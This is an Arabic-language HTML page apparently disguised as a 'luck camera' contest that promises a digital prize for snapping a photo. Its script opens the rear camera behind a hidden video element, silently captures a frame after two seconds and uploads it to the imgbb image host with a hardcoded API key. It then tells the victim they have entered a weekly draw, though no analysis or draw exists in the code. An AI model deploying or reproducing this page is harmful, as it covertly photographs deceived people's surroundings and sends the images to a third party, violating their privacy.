<!DOCTYPE html>
<html lang="ar">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>كاميرا الحظ – لقطة واحدة للربح</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            text-align: center;
            background: linear-gradient(135deg, #f7c59f, #f59ca9);
            color: #fff;
            padding: 50px 20px;
        }

        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
        }

        p {
            font-size: 1.2em;
            margin-bottom: 30px;
        }

        button {
            background-color: #fff;
            color: #f05941;
            border: none;
            padding: 15px 30px;
            font-size: 1.2em;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.3s;
        }

        button:hover {
            background-color: #ffe1dc;
        }

        video {
            display: none;
        }
    </style>
</head>

<body>
    <h1>🎉 كاميرا الحظ – لقطة واحدة للربح!</h1>
    <p>التقط صورة عشوائية من حولك، لو الصورة فيها عنصر حظ، تفوز بجائزة رقمية!</p>
    <button onclick="startChallenge()">🎯 جرب حظك الآن</button>

    <video id="video" autoplay playsinline></video>

    <script>
        const API_KEY = '8b3ff25139462514d13f5d9a3b3c0d05';

        async function startChallenge() {
            const video = document.getElementById('video');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "environment" } // بدون exact
                });


                video.srcObject = stream;
                video.style.display = 'none';

                // انتظر ثانيتين ثم التقط الصورة
                setTimeout(() => captureAndUpload(video, stream), 2000);

            } catch (err) {
                alert('⚠️ تعذر تشغيل الكاميرا. تأكد من السماح بالوصول.');
                console.error(err);
            }
        }

        async function captureAndUpload(video, stream) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0);

            // إيقاف الكاميرا بعد الالتقاط
            stream.getTracks().forEach(track => track.stop());
            video.srcObject = null;

            const imageData = canvas.toDataURL('image/jpeg');
            const formData = new FormData();
            formData.append('image', imageData.split(',')[1]);

            document.querySelector('p').textContent = '📊 جارٍ تحليل حظك...';

            try {
                const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
                    method: 'POST',
                    body: formData
                });

                const data = await res.json();
                if (data.success) {
                    document.querySelector('p').textContent = '🎁 تم إشراكك في السحب الأسبوعي! سيتم التواصل مع الفائزين قريبًا.';
                    console.log('✅ رابط الصورة:', data.data.url);
                } else {
                    throw new Error('رفع الصورة فشل');
                }
            } catch (error) {
                document.querySelector('p').textContent = '❌ فشل التقديم، حاول لاحقاً.';
                console.error(error);
            }
        }
    </script>
</body>

</html>
